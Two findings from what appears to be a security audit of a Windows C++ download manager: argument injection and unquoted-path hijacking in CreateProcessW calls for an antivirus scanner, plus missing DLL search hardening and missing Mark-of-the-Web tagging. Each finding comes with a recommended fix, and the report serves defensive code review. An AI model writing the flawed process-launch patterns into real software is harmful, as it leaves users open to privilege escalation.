### [SEC-011] Command-Line Quoting / Argument Injection in `ScanWithCustomExecutable` & `ScanWithDefender`
- **Category:** Security / Command Injection (`AGENTS.md` §7.1)
- **Severity:** `HIGH`
- **Priority:** `P1`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:** `src/security/antivirus_scanner.cpp:183, 240-252`
- **Evidence & Root Cause:**
  - In `ScanWithCustomExecutable` (`antivirus_scanner.cpp:240-252`), if `m_cfg.custom_args_template` contains `%1` (without quotes in the template) and `file_path` contains spaces, the path splits into multiple arguments. Conversely, if `custom_args_template` does not contain `%1`, line 251 appends `L"\"" + file_path.wstring() + L"\""` without escaping trailing backslashes (`\`).
  - Furthermore, `CreateProcessW` is invoked at line 141 with `lpApplicationName = nullptr` and only `cmd_line.data()`. If `m_cfg.custom_scanner_path` contains spaces (`C:\Program Files\Scanner\scan.exe`) and is not quoted in `cmd_line`, `CreateProcessW` searches `C:\Program.exe` first (classic Windows unquoted path privilege escalation / hijacking).
- **Recommended Fix:**
  - Pass `m_cfg.custom_scanner_path.c_str()` (and `defender_exe.c_str()`) as the first parameter (`lpApplicationName`) to `CreateProcessW`, and escape trailing backslashes when quoting `file_path`.

---

### [SEC-012] Missing `SetDefaultDllDirectories` Process Hardening and Missing Mark-of-the-Web (`Zone.Identifier` ADS) Propagation
- **Category:** Security / Defense-in-Depth & Documentation Compliance (`THREAT-009`, `docs/DATA_MODEL_AND_STORAGE.md:143`)
- **Severity:** `MEDIUM`
- **Priority:** `P2`
- **Confidence:** `CONFIRMED`
- **Status:** Confirmed by static analysis
- **Location:**
  - `src/app/main.cpp:62`
  - `src/nmh/main.cpp:199`
  - `src/brisk_engine/http_download_engine.cpp:1350`
- **Evidence & Root Cause:**
  1. `docs/SECURITY_THREAT_MODEL.md` (`THREAT-009`) explicitly mandates: *"Call `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)` and `SetSearchPathMode(BASE_SEARCH_PATH_ENABLE_SAFE_SEARCHMODE | BASE_SEARCH_PATH_PERMANENT)` at the first line of `wWinMain` in both `radium.exe` and `radium-nmh.exe`."* Neither `src/app/main.cpp` nor `src/nmh/main.cpp` calls either function! Moreover, `src/ui/win32_main_window.cpp:1985` calls `LoadLibraryW(L"uxtheme.dll")` without `LOAD_LIBRARY_SEARCH_SYSTEM32`.
  2. `docs/DATA_MODEL_AND_STORAGE.md:143` states that `write_motw_zone_identifier` (default `true`) writes the NTFS `:Zone.Identifier` Alternate Data Stream (`ZoneId=3`, `ReferrerUrl`, `HostUrl`) to downloaded files so Windows SmartScreen protects users when executing downloaded binaries. Neither `AppSettings` nor `CommitPartFile` implements `:Zone.Identifier` writing!
- **Recommended Fix:**
  1. Call `SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)` and `SetSearchPathMode(BASE_SEARCH_PATH_ENABLE_SAFE_SEARCHMODE | BASE_SEARCH_PATH_PERMANENT)` at the start of `main()` in `src/app/main.cpp`, `src/nmh/main.cpp`, and `src/worker_stream/nm3u8dl_re_worker.cpp`.
  2. Write `[ZoneTransfer]\r\nZoneId=3\r\n` to `<final_path>:Zone.Identifier` upon download completion when `write_motw_zone_identifier` is enabled.
